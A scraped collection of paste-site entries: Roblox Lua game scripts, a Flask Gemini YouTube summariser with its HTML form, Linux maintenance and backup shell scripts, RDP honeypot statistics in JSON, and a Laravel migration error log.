		-- if the player somehow dies or resets 
		player.CharacterAdded:Connect(function()
			task.wait(1)
			local currentWorms = playerWorms[playerID] or 0
			--update ui
			updateWormUI(player, currentWorms, false, false)
		end)
	else
		uiEvent:FireClient(player, { showAlert = true })
	end

	-- auto-save every 60 seconds
	coroutine.wrap(function()
		while player and player.Parent do
			task.wait(AUTOSAVE_INTERVAL)
			if dataChanged[playerID] then
				saveData(playerID, playerWorms[playerID])
				dataChanged[playerID] = false
			end
		end
	end)()
end



-- Connect player join/leave events, potion and purchasing of gamepass
function WormManager.Init()
	-- double potion 
	DWPevent.OnServerEvent:Connect(function(player)
		-- give for 5 mins then remove potion effect of doubling worm 
		playersWithPotionActive[tostring(player.UserId)] = true
		task.wait(300) 
		playersWithPotionActive[tostring(player.UserId)] = nil
	end)
	
	-- game pass event firing 
	purchasedGamePass.OnServerEvent:Connect(function(player)
		-- double check they have the game pass
		if MarketPlaceService:UserOwnsGamePassAsync(player.UserId, GAMEPASS_ID) then
			playersWithGamepass[tostring(player.UserId)] = true
		end
	end)
	
	
	Players.PlayerAdded:Connect(WormManager.LoadPlayer)
	Players.PlayerRemoving:Connect(WormManager.SavePlayer)
end


-- adding worms ie when buying in shop 
function WormManager.AddWorms(player, amount)
	local playerID = player.UserId
	playerWorms[playerID] = (playerWorms[playerID] or 0) + amount
	dataChanged[playerID] = true

	-- update UI
	updateWormUI(player, playerWorms[playerID], true, false)
end

-- when trying to buy items in shop
function WormManager.DeductWorms(player, amount)
	local playerID = player.UserId
	if not playerWorms[playerID] then 
		return false 
	end
	
	-- check players worms against amount, if the player has enough deducts and returns true, else returns false
	if playerWorms[playerID] >= amount then
		playerWorms[playerID] -= amount
		dataChanged[playerID] = true

		-- update ui
		updateWormUI(player, playerWorms[playerID], true, false)
	
		return true
	else
		return false -- not enough worms
	end
end



-- get name of player from id
local function getPlayerName(userId)
	if playerNameCache[userId] then
		return playerNameCache[userId]
	end

	local success, name = pcall(function()
		return Players:GetNameFromUserIdAsync(userId)
	end)

	if success and name then
		playerNameCache[userId] = name
		return name
	else
		return ""Unknown""
	end
end

-- get top five players by worm count
local function getTop5Players(playerWorms)
	local topList = {}

	-- Convert dictionary to sortable array
	for userId, wormCount in pairs(playerWorms) do
		local playerName = getPlayerName(userId)

		table.insert(topList, {
			PlayerName = playerName,
			Worms = wormCount
		})
	end

	-- Sort descending by worm count
	table.sort(topList, function(a, b)
		return a.Worms > b.Worms
	end)

	-- Return only the top 5
	local top5 = {}
	for i = 1, math.min(5, #topList) do
		table.insert(top5, topList[i])
	end

	return top5
end

-- updates teh leaderboard every 30 seconds
local function updateLeaderBoard()
	while true do
		textOfLeaderBoard.Text = """"
		local topFive = getTop5Players(playerWorms)
		for rank, data in ipairs(topFive) do
			textOfLeaderBoard.Text = textOfLeaderBoard.Text .. string.format(""%d. %s - %d\n"", rank, data.PlayerName, data.Worms)
		end

		task.wait(30) 
	end
end

-- run leaderboard updater in parallel thread
task.spawn(updateLeaderBoard)



return WormManager"
ZFd712wt,gdg-stjohns-python,faiaz-halim,Python,Tuesday 22nd of July 2025 10:10:16 PM CDT,"import os

from flask import Flask, render_template, request
from google import genai
from google.genai import types

app = Flask(__name__)

PROJECT_ID = ""REPLACE_WITH_YOUR_PROJECT_ID""

client = genai.Client(
   vertexai=True,
   project=PROJECT_ID,
   location=""us-central1"",
)

# Define the home page route.
@app.route('/', methods=['GET'])
def index():
   '''
   Renders the home page.
   Returns:The rendered template.
   '''
   return render_template('index.html')


def generate(youtube_link, model, additional_prompt):

   # Prepare youtube video using the provided link
   youtube_video = types.Part.from_uri(
       file_uri=youtube_link,
       mime_type=""video/*"",
   )

   # If addtional prompt is not provided, just append a space
   if not additional_prompt:
       additional_prompt = "" ""

   # Prepare content to send to the model
   contents = [
       youtube_video,
       types.Part.from_text(text=""""""Provide a summary of the video.""""""),
       additional_prompt,
   ]

   # Define content configuration
   generate_content_config = types.GenerateContentConfig(
       temperature = 1,
       top_p = 0.95,
       max_output_tokens = 8192,
       response_modalities = [""TEXT""],
   )

   return client.models.generate_content(
       model = model,
       contents = contents,
       config = generate_content_config,
   ).text

@app.route('/summarize', methods=['GET', 'POST'])
def summarize():
   '''
   Summarize the user provided YouTube video.
   Returns: Summary.
   '''

   # If the request is a POST request, process the form data.
   if request.method == 'POST':
       youtube_link = request.form['youtube_link']
       model = request.form['model']
       additional_prompt = request.form['additional_prompt']
     
       # Generate the summary.
       try:
           summary = generate(youtube_link, model, additional_prompt)
           return summary

       except ValueError as e:
           raise e
 
   # If the request is a GET request, redirect to the home page.
   else:
       return redirect('/')


if __name__ == '__main__':
   server_port = os.environ.get('PORT', '8080')
   app.run(debug=False, port=server_port, host='0.0.0.0')"
Rp9hV7bq,gdg-stjohns-html,faiaz-halim,HTML,Tuesday 22nd of July 2025 10:08:21 PM CDT,"<!DOCTYPE html>
<html>
 <head>
   <title>YouTube Summarizer</title>
   <style>
     body {
       font-family: sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
       background-color: #f4f4f4;
     }
     .container {
       background-color: white;
       padding: 30px;
       border-radius: 8px;
       box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
       text-align: center;
     }
     h2 {
       text-align: center;
       margin-bottom: 20px;
     }
     input[type=""text""], textarea, select {
       width: 100%;
       padding: 10px;
       margin-bottom: 15px;
       border: 1px solid #ccc;
       border-radius: 4px;
       box-sizing: border-box;
     }
     button {
       background-color: #4CAF50;
       color: white;
       padding: 12px 20px;
       border: none;
       border-radius: 4px;
       cursor: pointer;
     }
   </style>
 </head>
 <body>
   <div class=""container"">
     <h2>YouTube Summarizer</h2>
     <form action=""/summarize"" target=""_blank"" method=""post"">
       <input type=""text"" name=""youtube_link"" placeholder=""Enter YouTube Link"">
       <select name=""model"">
         <option value=""gemini-2.0-flash-001"">Gemini 2.0 Flash</option>
       </select>
       <textarea name=""additional_prompt"" placeholder=""Write your additional prompt here. For example: 'explain to me like I am five years old'""></textarea>
       <button type=""submit"">Summarize</button>
     </form>
   </div>
 </body>
</html>"
X7NfJJ7w,parrot code,NeedToSchool1,HTML 5,Tuesday 22nd of July 2025 07:45:12 PM CDT,"Check if the symlink you made exist:

ln -l /usr/lib/x86_64-linux-gnu/libjpeg.so.8

Remove symlink:

sudo rm -i /usr/lib/x86_64-linux-gnu/libjpeg.so.8

Download and install:

wget https://archive.debian.org/debian/pool/main/libj/libjpeg8/libjpeg8_8b-1_amd64.deb

sudo apt install ./libjpeg8_8b-1_amd64.deb"
abVtBQAs,menu-dialog.sh,vagnerfonseeca,Bash,Tuesday 22nd of July 2025 07:32:54 PM CDT,"#!/bin/bash
#
# Script menu.sh 
# Usado para exemplificar o uso de DIALOG nas aulas de Shell Script 
# 
# Criado por: Vagner Fonseca
# Versao: 0.1
#
#
#
# Testa se esta sendo executado no Modo Grafico ou Modo Texto
#
if [ -z $DISPLAY ]; then  
	export DIALOG=$(which dialog)
else
	export DIALOG=$(which Xdialog)
fi
#
# Cria o aquivo onde sera armazenada a resposta da pergunta dentro do dialog e
# se o script for cancelado ele apaga o arquivo
#
tempfile=`tempfile 2>/dev/null` || tempfile=/tmp/test$$
trap ""rm -f $tempfile"" 0 1 2 5 15
#
# Funcao que apresenta o menu para os usuarios escolherem as opcoes
#
function menu {
$DIALOG --backtitle ""Vagner Software LTDA"" --title ""MENU DE OPCOES"" \
        --menu ""Selecione abaixo o que deseja fazer:"" 18 50 10 \
        ""L""  ""Listar o /"" \
        ""D""  ""Exibir a data atual"" \
        ""U""  ""Ver o usuarios logados"" \
        ""K""  ""Ver a versao do Kernel"" \
        ""T""  ""Para ver o tempo de uso"" \
        ""S""  ""Para sair do Script"" 2> $tempfile
}
#
# Funcao que executa o que foi escolhido e apresenta o resultado do que foi feito
#
executa () {
RESP=$(cat $tempfile)
case $RESP in
	[L]) VAR=$(ls -l /); $DIALOG  --backtitle ""Vagner Software LTDA"" --title ""Lista do /"" --msgbox ""$VAR"" 30 80 ;;
	[D]) VAR=$(date); $DIALOG  --backtitle ""Vagner Software LTDA"" --title ""Data"" --msgbox ""$VAR"" 8 50 ;;
	[U]) VAR=$(w); $DIALOG  --backtitle ""Vagner Software LTDA"" --title ""Usuarios Logados"" --msgbox ""$VAR"" 20 80 ;;
	[K]) VAR=$(uname -r); $DIALOG  --backtitle ""Vagner Software LTDA"" --title ""Versao do Kernel"" --msgbox ""$VAR"" 8 40 ;;
	[T]) VAR=$(uptime); $DIALOG  --backtitle ""Vagner Software LTDA"" --title ""Tempo de Ligado"" --msgbox ""$VAR"" 8 70 ;;
	[S]) exit ;;
	*) $DIALOG  --backtitle ""Vagner Software LTDA"" --title ""Mensagem de erro"" --msgbox ""Para sair escolha a opcao S do menu"" 8 50;;
esac
}
#
# Evita que o script seja cancelado por algum sinal enviado por comando ou teclado
#
##trap 'echo ""Operacao Invalida""' 0 1 2 3 5 15 18 20 24
#
# Chama as funcoes dentro de um loop, portanto permanecera na tela ate que seja 
# escolhida a opcao sair
#
while true ; do
	clear
	menu
	executa
done
#
# Fim do script
"
K4eR0FRt,menu-de-texto.sh,vagnerfonseeca,Bash,Tuesday 22nd of July 2025 07:31:46 PM CDT,"#!/bin/bash
# menu-de-texto.sh
# Versao: 
# Script para:
# 2025-07-22 20:52-0300
# Codificacao utf-8
# Autor: Vagner Fonseca

# Cria um menu utilizavel em modo texto




while true ; do

echo -e ""\n""
echo ""Digite W para ver usuarios logados""
echo ""Digite K para ver versao kernel""
echo ""Digite I ver ip de internet""
echo ""Digite R repetir o menu""
echo ""Digite S para sair""
read RESP
echo -e ""\n""

case $RESP in 
	[wW]) w ;;
	[kK]) uname -r ;;
	[iI]) curl -4 https://icanhazip.com/ ;;
	[rR]) continue ;;
	[sS]) break ;;
	*) echo ""opcao nao reconhecida"" ;;
esac

done
echo ""FIM DE SCRIPT""
"
dKqnZD5h,bkp-rsync-var-inc.sh,vagnerfonseeca,Bash,Tuesday 22nd of July 2025 07:31:03 PM CDT,"#!/bin/bash

# A script to perform incremental backups using rsync

set -o errexit
set -o nounset
set -o pipefail

readonly SOURCE_DIR=""/var/log""
readonly BACKUP_DIR=""/mnt/data/backup""
readonly DATETIME=""$(date '+%Y-%m-%d_%H:%M:%S')""
readonly BACKUP_PATH=""${BACKUP_DIR}/${DATETIME}""
readonly LATEST_LINK=""${BACKUP_DIR}/latest""

if [ -d ""$BACKUP_DIR""  ] ; then
	echo ""Diretorio existe""
else
	mkdir -p ""${BACKUP_DIR}""
fi

rsync -av --delete \
  ""${SOURCE_DIR}/"" \
  --link-dest ""${LATEST_LINK}"" \
  --exclude="".cache"" \
  ""${BACKUP_PATH}""

rm -rf ""${LATEST_LINK}""
ln -s ""${BACKUP_PATH}"" ""${LATEST_LINK}""
"
scdXysyQ,2025-07-21_stats.json,rdp_snitch,JSON,Tuesday 22nd of July 2025 07:18:11 PM CDT,"{
  ""ip"": {
    ""51.79.199.48"": 3756,
    ""159.223.43.222"": 6,
    ""45.79.152.94"": 12,
    ""143.110.138.22"": 3,
    ""147.185.132.73"": 9,
    ""194.164.107.6"": 30,
    ""167.94.138.175"": 3,
    ""80.94.95.75"": 30,
    ""194.180.49.127"": 3,
    ""88.214.50.58"": 18,
    ""147.185.132.249"": 9,
    ""188.166.231.132"": 9,
    ""181.30.42.98"": 3,
    ""96.51.53.164"": 6,
    ""45.33.87.154"": 3,
    ""167.94.138.123"": 3,
    ""139.162.13.76"": 12,
    ""128.22.147.233"": 3,
    ""102.88.21.212"": 3,
    ""217.114.43.37"": 21,
    ""111.170.152.113"": 9,
    ""198.235.24.161"": 9,
    ""51.83.22.246"": 3,
    ""45.227.254.151"": 6,
    ""88.214.25.123"": 6,
    ""165.154.182.72"": 3,
    ""210.211.99.136"": 3,
    ""192.3.154.55"": 3,
    ""167.94.145.100"": 3,
    ""205.210.31.72"": 9
  },
  ""asn"": {
    ""AS16276"": 3759,
    ""AS14061"": 18,
    ""AS63949"": 27,
    ""AS396982"": 36,
    ""AS50219"": 30,
    ""AS398324"": 6,
    ""AS204428"": 30,
    ""AS201814"": 3,
    ""AS209372"": 18,
    ""AS7303"": 3,
    ""AS6327"": 6,
    ""AS17511"": 3,
    ""AS29465"": 3,
    ""AS210546"": 21,
    ""AS151185"": 9,
    ""AS267784"": 6,
    ""AS35042"": 6,
    ""AS135377"": 3,
    ""AS38731"": 3,
    ""AS36352"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""OVH Singapore PTE. LTD"": 3756,
    ""DigitalOcean, LLC"": 18,
    ""Akamai Technologies, Inc."": 15,
    ""Google LLC"": 36,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""Censys, Inc."": 9,
    ""SS-Net"": 30,
    ""MEVSPACE sp. z o.o."": 3,
    ""WS Telecom Inc"": 18,
    ""Telecom Argentina S.A"": 3,
    ""Shaw Communications Inc."": 6,
    ""LINODE"": 12,
    ""OPTAGE Inc."": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""Miglovets Egor Andreevich"": 21,
    ""China Telecom"": 9,
    ""OVH SAS"": 3,
    ""Flyservers S.A."": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""VTDC"": 3,
    ""HostPapa"": 3
  },
  ""org"": {
    ""LTD, MassiveGRID"": 3756,
    ""DigitalOcean, LLC"": 6,
    ""Linode"": 15,
    ""Digital Ocean"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Valence Technology Co"": 30,
    ""Censys, Inc"": 6,
    ""Unmanaged LTD"": 30,
    ""HostSlick"": 3,
    ""Stimul LLC"": 18,
    ""Digitalocean"": 9,
    ""Fibertel"": 3,
    ""Shaw Communications Inc"": 6,
    ""Linode, LLC"": 12,
    ""OPTAGE Inc."": 3,
    ""MTN Nigeria"": 3,
    ""Natalia Aleksandrovna Petrova"": 21,
    ""Chinanet HB"": 9,
    ""OVH"": 3,
    ""Xwin Universal LTD"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Viettel - CHT Company Ltd"": 3,
    ""HostPapa"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""North West"": 3798,
    ""South West"": 15,
    ""New Jersey"": 15,
    ""California"": 42,
    ""Michigan"": 9,
    ""Sofia-Capital"": 30,
    ""Bavaria"": 3,
    ""Moscow"": 39,
    ""Buenos Aires"": 3,
    ""Alberta"": 6,
    ""Kyoto"": 3,
    ""Lagos"": 3,
    ""Hubei"": 9,
    ""Hauts-de-France"": 3,
    ""Vilnius"": 6,
    ""Kowloon City"": 6,
    ""Hanoi"": 3,
    ""New York"": 3
  },
  ""country"": {
    ""Singapore"": 3813,
    ""United States"": 69,
    ""Bulgaria"": 30,
    ""Germany"": 3,
    ""Russia"": 39,
    ""Argentina"": 3,
    ""Canada"": 6,
    ""Japan"": 3,
    ""Nigeria"": 3,
    ""China"": 9,
    ""France"": 3,
    ""Lithuania"": 6,
    ""Hong Kong"": 6,
    ""Vietnam"": 3
  },
  ""account"": {
    ""hello"": 3837,
    ""zrk2bkbo"": 12,
    ""beio"": 3,
    ""wJqBuHtOX"": 3,
    ""rrJbit"": 3,
    ""uFmSko"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""(empty)"": 15,
    ""Administr"": 48,
    ""xyVUKpxNw"": 3,
    ""McOMFS"": 3,
    ""PTAyAz"": 3,
    ""gaLHSgrTF"": 3,
    ""bYWgqt"": 3,
    ""kWrhvm"": 3,
    ""Test"": 12,
    ""Administrator"": 3,
    ""SyQCEmkmw"": 3,
    ""RgklAh"": 3,
    ""wIREqq"": 3
  },
  ""keyboard"": {
    ""Unknown"": 3996
  },
  ""client_build"": {
    ""Unknown"": 3996
  },
  ""client_name"": {
    ""Unknown"": 3996
  },
  ""ip_type"": {
    ""hosting"": 3843,
    ""hosting & proxy"": 6,
    ""Unknown"": 144,
    ""mobile & hosting"": 3
  }
}"
4AU9MKRA,2025-07-21_stats.json,rdp_snitch,JSON,Tuesday 22nd of July 2025 07:16:05 PM CDT,"{
  ""ip"": {
    ""51.79.199.48"": 3755,
    ""159.223.43.222"": 6,
    ""45.79.152.94"": 12,
    ""143.110.138.22"": 3,
    ""147.185.132.73"": 9,
    ""194.164.107.6"": 30,
    ""167.94.138.175"": 3,
    ""80.94.95.75"": 30,
    ""194.180.49.127"": 3,
    ""88.214.50.58"": 18,
    ""147.185.132.249"": 9,
    ""188.166.231.132"": 9,
    ""181.30.42.98"": 3,
    ""96.51.53.164"": 6,
    ""45.33.87.154"": 3,
    ""167.94.138.123"": 3,
    ""139.162.13.76"": 12,
    ""128.22.147.233"": 3,
    ""102.88.21.212"": 3,
    ""217.114.43.37"": 21,
    ""111.170.152.113"": 9,
    ""198.235.24.161"": 9,
    ""51.83.22.246"": 3,
    ""45.227.254.151"": 6,
    ""88.214.25.123"": 6,
    ""165.154.182.72"": 3,
    ""210.211.99.136"": 3,
    ""192.3.154.55"": 3,
    ""167.94.145.100"": 3,
    ""205.210.31.72"": 9
  },
  ""asn"": {
    ""AS16276"": 3758,
    ""AS14061"": 18,
    ""AS63949"": 27,
    ""AS396982"": 36,
    ""AS50219"": 30,
    ""AS398324"": 6,
    ""AS204428"": 30,
    ""AS201814"": 3,
    ""AS209372"": 18,
    ""AS7303"": 3,
    ""AS6327"": 6,
    ""AS17511"": 3,
    ""AS29465"": 3,
    ""AS210546"": 21,
    ""AS151185"": 9,
    ""AS267784"": 6,
    ""AS35042"": 6,
    ""AS135377"": 3,
    ""AS38731"": 3,
    ""AS36352"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""OVH Singapore PTE. LTD"": 3755,
    ""DigitalOcean, LLC"": 18,
    ""Akamai Technologies, Inc."": 15,
    ""Google LLC"": 36,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""Censys, Inc."": 9,
    ""SS-Net"": 30,
    ""MEVSPACE sp. z o.o."": 3,
    ""WS Telecom Inc"": 18,
    ""Telecom Argentina S.A"": 3,
    ""Shaw Communications Inc."": 6,
    ""LINODE"": 12,
    ""OPTAGE Inc."": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""Miglovets Egor Andreevich"": 21,
    ""China Telecom"": 9,
    ""OVH SAS"": 3,
    ""Flyservers S.A."": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""VTDC"": 3,
    ""HostPapa"": 3
  },
  ""org"": {
    ""LTD, MassiveGRID"": 3755,
    ""DigitalOcean, LLC"": 6,
    ""Linode"": 15,
    ""Digital Ocean"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Valence Technology Co"": 30,
    ""Censys, Inc"": 6,
    ""Unmanaged LTD"": 30,
    ""HostSlick"": 3,
    ""Stimul LLC"": 18,
    ""Digitalocean"": 9,
    ""Fibertel"": 3,
    ""Shaw Communications Inc"": 6,
    ""Linode, LLC"": 12,
    ""OPTAGE Inc."": 3,
    ""MTN Nigeria"": 3,
    ""Natalia Aleksandrovna Petrova"": 21,
    ""Chinanet HB"": 9,
    ""OVH"": 3,
    ""Xwin Universal LTD"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Viettel - CHT Company Ltd"": 3,
    ""HostPapa"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""North West"": 3797,
    ""South West"": 15,
    ""New Jersey"": 15,
    ""California"": 42,
    ""Michigan"": 9,
    ""Sofia-Capital"": 30,
    ""Bavaria"": 3,
    ""Moscow"": 39,
    ""Buenos Aires"": 3,
    ""Alberta"": 6,
    ""Kyoto"": 3,
    ""Lagos"": 3,
    ""Hubei"": 9,
    ""Hauts-de-France"": 3,
    ""Vilnius"": 6,
    ""Kowloon City"": 6,
    ""Hanoi"": 3,
    ""New York"": 3
  },
  ""country"": {
    ""Singapore"": 3812,
    ""United States"": 69,
    ""Bulgaria"": 30,
    ""Germany"": 3,
    ""Russia"": 39,
    ""Argentina"": 3,
    ""Canada"": 6,
    ""Japan"": 3,
    ""Nigeria"": 3,
    ""China"": 9,
    ""France"": 3,
    ""Lithuania"": 6,
    ""Hong Kong"": 6,
    ""Vietnam"": 3
  },
  ""account"": {
    ""hello"": 3836,
    ""zrk2bkbo"": 12,
    ""beio"": 3,
    ""wJqBuHtOX"": 3,
    ""rrJbit"": 3,
    ""uFmSko"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""(empty)"": 15,
    ""Administr"": 48,
    ""xyVUKpxNw"": 3,
    ""McOMFS"": 3,
    ""PTAyAz"": 3,
    ""gaLHSgrTF"": 3,
    ""bYWgqt"": 3,
    ""kWrhvm"": 3,
    ""Test"": 12,
    ""Administrator"": 3,
    ""SyQCEmkmw"": 3,
    ""RgklAh"": 3,
    ""wIREqq"": 3
  },
  ""keyboard"": {
    ""Unknown"": 3995
  },
  ""client_build"": {
    ""Unknown"": 3995
  },
  ""client_name"": {
    ""Unknown"": 3995
  },
  ""ip_type"": {
    ""hosting"": 3842,
    ""hosting & proxy"": 6,
    ""Unknown"": 144,
    ""mobile & hosting"": 3
  }
}"
41Xy5MXe,2025-07-21_stats.json,rdp_snitch,JSON,Tuesday 22nd of July 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""51.79.199.48"": 3754,
    ""159.223.43.222"": 6,
    ""45.79.152.94"": 12,
    ""143.110.138.22"": 3,
    ""147.185.132.73"": 9,
    ""194.164.107.6"": 30,
    ""167.94.138.175"": 3,
    ""80.94.95.75"": 30,
    ""194.180.49.127"": 3,
    ""88.214.50.58"": 18,
    ""147.185.132.249"": 9,
    ""188.166.231.132"": 9,
    ""181.30.42.98"": 3,
    ""96.51.53.164"": 6,
    ""45.33.87.154"": 3,
    ""167.94.138.123"": 3,
    ""139.162.13.76"": 12,
    ""128.22.147.233"": 3,
    ""102.88.21.212"": 3,
    ""217.114.43.37"": 21,
    ""111.170.152.113"": 9,
    ""198.235.24.161"": 9,
    ""51.83.22.246"": 3,
    ""45.227.254.151"": 6,
    ""88.214.25.123"": 6,
    ""165.154.182.72"": 3,
    ""210.211.99.136"": 3,
    ""192.3.154.55"": 3,
    ""167.94.145.100"": 3,
    ""205.210.31.72"": 9
  },
  ""asn"": {
    ""AS16276"": 3757,
    ""AS14061"": 18,
    ""AS63949"": 27,
    ""AS396982"": 36,
    ""AS50219"": 30,
    ""AS398324"": 6,
    ""AS204428"": 30,
    ""AS201814"": 3,
    ""AS209372"": 18,
    ""AS7303"": 3,
    ""AS6327"": 6,
    ""AS17511"": 3,
    ""AS29465"": 3,
    ""AS210546"": 21,
    ""AS151185"": 9,
    ""AS267784"": 6,
    ""AS35042"": 6,
    ""AS135377"": 3,
    ""AS38731"": 3,
    ""AS36352"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""OVH Singapore PTE. LTD"": 3754,
    ""DigitalOcean, LLC"": 18,
    ""Akamai Technologies, Inc."": 15,
    ""Google LLC"": 36,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""Censys, Inc."": 9,
    ""SS-Net"": 30,
    ""MEVSPACE sp. z o.o."": 3,
    ""WS Telecom Inc"": 18,
    ""Telecom Argentina S.A"": 3,
    ""Shaw Communications Inc."": 6,
    ""LINODE"": 12,
    ""OPTAGE Inc."": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""Miglovets Egor Andreevich"": 21,
    ""China Telecom"": 9,
    ""OVH SAS"": 3,
    ""Flyservers S.A."": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""VTDC"": 3,
    ""HostPapa"": 3
  },
  ""org"": {
    ""LTD, MassiveGRID"": 3754,
    ""DigitalOcean, LLC"": 6,
    ""Linode"": 15,
    ""Digital Ocean"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Valence Technology Co"": 30,
    ""Censys, Inc"": 6,
    ""Unmanaged LTD"": 30,
    ""HostSlick"": 3,
    ""Stimul LLC"": 18,
    ""Digitalocean"": 9,
    ""Fibertel"": 3,
    ""Shaw Communications Inc"": 6,
    ""Linode, LLC"": 12,
    ""OPTAGE Inc."": 3,
    ""MTN Nigeria"": 3,
    ""Natalia Aleksandrovna Petrova"": 21,
    ""Chinanet HB"": 9,
    ""OVH"": 3,
    ""Xwin Universal LTD"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Viettel - CHT Company Ltd"": 3,
    ""HostPapa"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""North West"": 3796,
    ""South West"": 15,
    ""New Jersey"": 15,
    ""California"": 42,
    ""Michigan"": 9,
    ""Sofia-Capital"": 30,
    ""Bavaria"": 3,
    ""Moscow"": 39,
    ""Buenos Aires"": 3,
    ""Alberta"": 6,
    ""Kyoto"": 3,
    ""Lagos"": 3,
    ""Hubei"": 9,
    ""Hauts-de-France"": 3,
    ""Vilnius"": 6,
    ""Kowloon City"": 6,
    ""Hanoi"": 3,
    ""New York"": 3
  },
  ""country"": {
    ""Singapore"": 3811,
    ""United States"": 69,
    ""Bulgaria"": 30,
    ""Germany"": 3,
    ""Russia"": 39,
    ""Argentina"": 3,
    ""Canada"": 6,
    ""Japan"": 3,
    ""Nigeria"": 3,
    ""China"": 9,
    ""France"": 3,
    ""Lithuania"": 6,
    ""Hong Kong"": 6,
    ""Vietnam"": 3
  },
  ""account"": {
    ""hello"": 3835,
    ""zrk2bkbo"": 12,
    ""beio"": 3,
    ""wJqBuHtOX"": 3,
    ""rrJbit"": 3,
    ""uFmSko"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""(empty)"": 15,
    ""Administr"": 48,
    ""xyVUKpxNw"": 3,
    ""McOMFS"": 3,
    ""PTAyAz"": 3,
    ""gaLHSgrTF"": 3,
    ""bYWgqt"": 3,
    ""kWrhvm"": 3,
    ""Test"": 12,
    ""Administrator"": 3,
    ""SyQCEmkmw"": 3,
    ""RgklAh"": 3,
    ""wIREqq"": 3
  },
  ""keyboard"": {
    ""Unknown"": 3994
  },
  ""client_build"": {
    ""Unknown"": 3994
  },
  ""client_name"": {
    ""Unknown"": 3994
  },
  ""ip_type"": {
    ""hosting"": 3841,
    ""hosting & proxy"": 6,
    ""Unknown"": 144,
    ""mobile & hosting"": 3
  }
}"
4kv2XVU8,Untitled,smokex,Bash,Tuesday 22nd of July 2025 06:42:22 PM CDT,"Migrating Notify (Winter.Notify) plugin...

   INFO  Running migrations.  

  2.0.1:    Rebrand table indexes .................................................................................. 47ms FAIL
PHP Deprecated:  Illuminate\Log\Logger::__construct(): Implicitly marking parameter $dispatcher as nullable is deprecated, the explicit nullable type must be used instead in /home/annoncom/domains/dev.annon.com.au/public_html/vendor/laravel/framework/src/Illuminate/Log/Logger.php on line 43

In Connection.php line 760:
                                                                                                                               
  SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresp  
  onds to your MariaDB server version for the right syntax to use near 'index `rainlab_notify_notifications_notifiable_id_not  
  ifiable_type_index` to `...' at line 1 (SQL: alter table `winter_notify_notifications` rename index `rainlab_notify_notific  
  ations_notifiable_id_notifiable_type_index` to `winter_notify_notifications_notifiable_id_notifiable_type_index`)            
                                                                                                                               

In Exception.php line 18:
                                                                                                                               
  SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresp  
  onds to your MariaDB server version for the right syntax to use near 'index `rainlab_notify_notifications_notifiable_id_not  
  ifiable_type_index` to `...' at line 1                                                                                       
                                                                                                                               

In PDOConnection.php line 82:
                                                                                                                               
  SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresp  
  onds to your MariaDB server version for the right syntax to use near 'index `rainlab_notify_notifications_notifiable_id_not  
  ifiable_type_index` to `...' at line 1                                                                                       
                                        "
g58GuN1k,Grapple and Climb TRY 2,arminhello,Lua,Tuesday 22nd of July 2025 04:57:45 PM CDT,"-- grab core services
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local UserInputService = game:GetService(""UserInputService"")
local TweenService = game:GetService(""TweenService"")
local StarterGui = game:GetService(""StarterGui"")
local ContextActionService = game:GetService(""ContextActionService"")

-- get basic refs
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

-- wait till we got a char
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild(""Humanoid"")
local rootPart = character:WaitForChild(""HumanoidRootPart"")

-- simple state thing to track what we're doing
local state = {}
state.__index = state
state.current = ""Idle""

function state:set(newState)
	self.current = newState
end

function state:is(val)
	return self.current == val
end

-- basic config stuff
local GRAPPLE_SPEED = 120
local CLIMB_SPEED = 1
local CLIMB_DURATION = 1.5
local WALL_CHECK_DISTANCE = 5
local COOLDOWN_TIME = 1.2

-- visuals and state flags
local grapplePoint = nil
local isGrappling = false
local isClimbing = false
local beam = nil
local attachments = {}

-- ui setup for cooldown bar
local ui = Instance.new(""ScreenGui"")
ui.Name = ""GrappleUI""
ui.ResetOnSpawn = false
ui.Parent = player:WaitForChild(""PlayerGui"")

local cooldownBar = Instance.new(""Frame"")
cooldownBar.Size = UDim2.new(0, 100, 0, 6)
cooldownBar.Position = UDim2.new(0.5, -50, 0.95, 0)
cooldownBar.BackgroundColor3 = Color3.fromRGB(60, 180, 255)
cooldownBar.BorderSizePixel = 0
cooldownBar.Visible = false
cooldownBar.Parent = ui

local cooldownFill = Instance.new(""Frame"")
